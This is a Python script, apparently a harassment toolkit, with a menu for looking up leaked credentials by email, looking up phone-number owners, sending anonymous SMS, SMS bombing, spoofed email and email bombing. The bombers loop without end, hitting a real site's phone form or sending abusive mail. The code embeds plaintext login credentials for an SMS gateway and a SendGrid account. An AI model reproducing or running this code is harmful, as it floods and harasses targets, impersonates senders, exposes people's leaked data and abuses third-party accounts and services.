# -*- coding: utf-8 -*-
import requests
import re
import urllib2
import sys      
import smtplib
from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText
#banners
banner ="""
###############################################
# ┬ ┬┌─┐┌─┐┬┌─┌─┐┬─┐┌─┐  ┌┬┐┌─┐┌─┐┬  ┬┌─┬┌┬┐  #
# ├─┤├─┤│  ├┴┐├┤ ├┬┘└─┐   │ │ ││ ││  ├┴┐│ │   #
# ┴ ┴┴ ┴└─┘┴ ┴└─┘┴└─└─┘   ┴ └─┘└─┘┴─┘┴ ┴┴ ┴   #
#          Made with <3  by Hx01              #
###############################################   
        Homepage : https://Hx01.me
           Twitter : @hxzeroone
                  [+] Menu :
                1.Cr3ds Find3r
                2.Numb3r Inf0
                3.AnonSms Send3r
                4.Sms bomb3r
                5.Sp00fmail Send3r
                6.Email Spamm3r
                7.Quit
"""
ebanner ="""
+---------+---------+
| Cr3ds   | FINDER  |
+---------+---------+
Author : hx01(@hxzeroone)
Url : https://Hx01.me
"""
mbanner = """
+------------+-----------+
|Numb3r inf0 | FINDER    |
+------------+-----------+
Author : hx01(@hxzeroone)
Url : https://Hx01.me
"""
abanner = """
+----+----+
|ANON|SMS |
-----+----+
Author : hx01(@hxzeroone)
Url : https://Hx01.me
"""
sbanner = """
+----+---------+
|SMS | B0MB3R  |
-----+---------+
Author : hx01(@hxzeroone)
Url : https://Hx01.me
"""

epbanner = """
+----------+---------+
|SP00FMAIL | SEND3R  |
+----------+---------+
Author : hx01(@hxzeroone)
Url : https://Hx01.me
"""
esbanner ="""
+---------+---------+
| Email   | Spamm3r |
+---------+---------+
Author : hx01(@hxzeroone)
Url : https://Hx01.me
"""
#colors
class bcolors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
#scripts
def creds():

            #credsfinder
             #ebanner
          print ( bcolors.BOLD + bcolors.RED + ebanner )
#userinput
          email = raw_input(bcolors.BOLD +"[+]Email:"+ bcolors.WARNING)
#post req
          url="https://ghostproject.fr/search.php"
          pay = {'param': email }
          response = requests.post(url, data=pay)
          raw_html = response.text
# Replace HTML tags with an empty string.
          result = re.sub("<.*?>", "", raw_html)
          final =  result.splitlines()
          print "[+] inf0 : "
          if "Connection timed out" in result :
                                               print ( bcolors.BOLD + bcolors.RED + "api down :(" )
          else :
                print final
          sys.exit()
          creds()   
 #numberfinder
def num():
               
                print ( bcolors.BOLD + bcolors.RED + mbanner )
                #userinput
                phone = raw_input(bcolors.BOLD +"[+] Phone :"+ bcolors.WARNING)
                print "[+] Inf0 :"
                #req
                dbinf = urllib2.urlopen('https://carbonmonoxide2.000webhostapp.com/api.php?num='+phone).read( )
                print dbinf
                sys.exit()
                num() 
#smsbomber
def bomber():
            print ( bcolors.BOLD + bcolors.RED + sbanner )
            #input
            phone = raw_input( bcolors.WARNING + "[+] Target:")  
            #Request                           
            #loop              
            x="1"
            while x == "1":
                                                                                    
                           url = 'https://cedaradmissions.com/login/add_phone_number'
                           payload = {'phone_number': phone}
                           headers = {'Content-Type': 'application/x-www-form-urlencoded'}
                           response = requests.post(url, data=payload, headers=headers)
                           raw_html = response.text
                           print raw_html
                              
                         
            bomber()    

#anonsms
def anon():
          #banner
           print ( bcolors.BOLD + bcolors.RED + abanner )
          #userinput
           phone = raw_input(bcolors.BOLD + bcolors.WARNING+"[+] To :"+ bcolors.RED)
           sms = raw_input(bcolors.BOLD + bcolors.WARNING +"[+] Message :"+ bcolors.RED)                
           #req
           uri = 'http://119.160.92.2:7700/sendsms_url.html?Username=03028504778&Password=Pakistan123&From=TUF.FSD&Message={}&To={}'.format(sms,phone)
           url = uri.replace(' ', '%20')
           dbf = urllib2.urlopen(url).read( )
           print dbf
           sys.exit()
           anon() 
#spoofmail
def emailsp():
              #banner
              print ( bcolors.BOLD + bcolors.RED + epbanner) 
              #inputs  
              fromaddr = raw_input(bcolors.BOLD + bcolors.WARNING+"[+]From:"+ bcolors.RED)
              toaddr = raw_input(bcolors.BOLD + bcolors.WARNING+"[+]To :"+ bcolors.RED)
              msg = MIMEMultipart()
              msg['From'] = fromaddr
              msg['To'] = toaddr
              msg['Subject'] = raw_input(bcolors.BOLD + bcolors.WARNING+"[+]Subject:"+ bcolors.RED)
              body = raw_input(bcolors.BOLD + bcolors.WARNING+"[+]Message:"+ bcolors.RED)
              msg.attach(MIMEText(body, 'plain'))
              #auth 
              server = smtplib.SMTP('smtp.sendgrid.net', 587)
              server.starttls()
              server.login("kashifnaeem", "haditel2015")
              text = msg.as_string()
              server.sendmail(fromaddr, toaddr, text)              
              server.quit()
              sys.exit("Email Sent !")
              emailsp()
#emailbomber
def emailb0mber():
              #banner
              print ( bcolors.BOLD + bcolors.RED + esbanner)
              #input
              toaddr = raw_input(bcolors.RED+"To :"+ bcolors.WARNING)
              #loop
              loop = 1
              while loop == 1:  
                              #data  
                              fromaddr = "spam@hx01.me"             
                              msg = MIMEMultipart()
                              msg['From'] = fromaddr
                              msg['To'] = toaddr
                              msg['Subject'] = "bombed"
                              body = "hahah you're fucked lad"
                              msg.attach(MIMEText(body, 'plain'))
                              #auth 
                              server = smtplib.SMTP('smtp.sendgrid.net', 587)
                              server.starttls()
                              server.login("kashifnaeem", "haditel2015")
                              text = msg.as_string()
                              server.sendmail(fromaddr, toaddr, text)
                              print (bcolors.RED +"Spamming...")                            
             
              emailb0mber()
#main
print (bcolors.WARNING + banner)                    
#prompt
prompt = raw_input(bcolors.BOLD + bcolors.RED + """Select 0ption :
 """)
if prompt == "1":
   creds() 
elif prompt == "2":
   num()  
elif prompt == "3":
   anon() 
elif prompt == "4":
   bomber()
elif prompt == "5":
   emailsp()
elif prompt == "6":
    emailb0mber()
else :
  pass   
